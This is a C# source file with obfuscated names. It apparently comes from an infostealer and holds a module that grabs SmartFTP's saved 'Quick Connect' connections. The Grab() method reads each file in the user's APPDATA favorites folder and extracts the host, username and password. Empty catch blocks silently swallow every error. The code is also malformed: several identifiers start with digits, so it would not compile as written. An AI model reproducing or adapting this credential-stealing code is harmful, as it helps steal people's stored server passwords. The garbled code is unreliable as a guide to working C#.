using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using C6Zy;
using Je03;

namespace rk937aHHc
{
	public class SmartFTP : EtbH
	{
		public SmartFTP()
		{
			this.kmqGcD = "SmartFTP";
		}

		public string kmqGcD { get; set; }

        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> list = new List<WTitxI2m>();

            try
            {
                string path = Path.Combine(
                    Environment.GetEnvironmentVariable("APPDATA"),
                    @"SmartFTP\Client 2.0\Favorites\Quick Connect"
                );

                if (!Directory.Exists(path))
                    return list;

                string[] files = Directory.GetFiles(path);

                foreach (string file in files)
                {
                    try
                    {
                        wwVTa1 parsed = wwVTa1.d9DuXvT7N(File.ReadAllBytes(file));
                        WTitxI2m entry = new WTitxI2m();

                        foreach (2l3Fyo item in parsed.9n6vI7Q7)
                {
                            try
                            {
                                uint id = ((jlA4fWu)item).0Xm;
                                string value = (string)item.mxxLqwO53K.DTO;

                                if (id == 3)
                                {
                                    // Host
                                    entry.data1 = value;
                                }
                                else if (id == 12)
                                {
                                    // Username
                                    entry.data2 = value;
                                }
                                else if (id == 13)
                                {
                                    // Password
                                    entry.data3 = value;
                                }
                            }
                            catch
                            {
                            }
                        }

                        entry.data4 = this.kmqGcD;
                        list.Add(entry);
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }

            return list;
        }
    }
}
